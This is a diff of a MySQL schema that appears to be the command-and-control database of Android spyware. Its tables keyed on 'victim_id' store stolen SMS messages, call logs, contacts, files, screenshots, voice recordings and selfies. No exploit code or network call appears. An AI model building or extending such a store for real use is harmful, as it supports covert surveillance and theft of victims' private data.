@@ -76,7 +76,7 @@ DROP TABLE IF EXISTS `deliveries`;
 CREATE TABLE IF NOT EXISTS `deliveries` (
   `id`                   INT(11) NOT NULL    AUTO_INCREMENT,
   `victim_id`            INT(11) NOT NULL,
-  `data_type` ENUM('messages', 'command_statuses', 'call_logs', 'contacts', 'files', 'media_screen_shot', 'media_voice', 'media_selfie', 'join', 're_join', 'other') NOT NULL,
+  `data_type`            ENUM('messages', 'command_statuses', 'call_logs', 'contacts', 'files', 'media_screen_shot', 'media_voice', 'media_selfie', 'join', 're_join', 'other') NOT NULL,
   `error`                TINYINT(4) NOT NULL,
   `message`              TEXT NOT NULL,
   `server_error`         TINYINT(4) NOT NULL DEFAULT 0,
@@ -188,7 +188,9 @@ CREATE TABLE IF NOT EXISTS `files` (
   `is_active`            TINYINT(4) NOT NULL DEFAULT 1,
   `last_logged_at`       TIMESTAMP  NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
-  FOREIGN KEY (`parent_id`) REFERENCES `files`(`id`) ON UPDATE CASCADE ON DELETE CASCADE,
+  FOREIGN KEY (`parent_id`) REFERENCES `files` (`id`)
+    ON UPDATE CASCADE
+    ON DELETE CASCADE,
   FOREIGN KEY (`file_bundle_id`) REFERENCES `file_bundles` (`id`)
     ON UPDATE CASCADE
     ON DELETE CASCADE
@@ -231,13 +233,14 @@ CREATE TABLE IF NOT EXISTS `media` (
 
 DROP TABLE IF EXISTS `messages`;
 CREATE TABLE IF NOT EXISTS `messages` (
-  `id`             INT(11)                  NOT NULL AUTO_INCREMENT,
-  `victim_id`      INT(11)                  NOT NULL,
-  `phone`          VARCHAR(20)              NOT NULL,
-  `content`        TEXT                     NOT NULL,
-  `_type`          ENUM ('inbox', 'outbox') NOT NULL,
-  `delivered_at`   BIGINT                   NOT NULL,
-  `last_logged_at` TIMESTAMP                NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+  `id`                 INT(11)                         NOT NULL AUTO_INCREMENT,
+  `victim_id`          INT(11)                         NOT NULL,
+  `android_contact_id` INT(11)                         NOT NULL,
+  `_from`              VARCHAR(50)                     NOT NULL,
+  `content`            TEXT                            NOT NULL,
+  `_type`              ENUM ('inbox', 'sent', 'draft') NOT NULL,
+  `delivery_time`      BIGINT                          NOT NULL,
+  `last_logged_at`     TIMESTAMP                       NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
   KEY `victim_id` (`victim_id`),
   FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
